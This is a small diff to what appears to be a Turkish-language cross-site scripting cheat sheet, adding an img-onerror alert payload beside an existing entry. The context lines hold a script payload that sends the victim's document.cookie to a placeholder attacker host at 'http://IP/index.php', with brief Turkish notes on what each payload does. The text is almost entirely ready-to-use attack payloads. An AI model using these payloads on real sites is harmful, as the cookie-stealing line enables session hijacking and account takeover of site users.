@@ -27,3 +27,7 @@ Dışardan dosya yükler.
 
     <script>new Image().src='http://IP/index.php?c='+document.cookie</script>
 Çerez ayrıntılarını yazar.
+
+
+    <img src="" onerror=alert(window.origin)>
+Sayfada resim yok ise otomotik olarak onerror verir ve alert'i çalıştırır.
